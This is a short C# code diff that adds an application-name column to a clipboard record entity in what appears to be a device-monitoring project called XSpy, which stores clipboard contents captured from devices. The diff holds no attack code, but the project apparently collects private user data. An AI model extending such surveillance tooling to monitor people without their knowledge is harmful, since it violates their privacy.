@@ -12,6 +12,7 @@ namespace XSpy.Database.Entities.Devices
     public class Clipboard : BaseDeviceEntity
     {
         [Column("content")] public string Content { get; set; }
+        [Column("app_name"), MaxLength(255)] public string AppName { get; set; }
         [Column("is_clipboard")] public bool IsClipboard { get; set; }
     }
 }
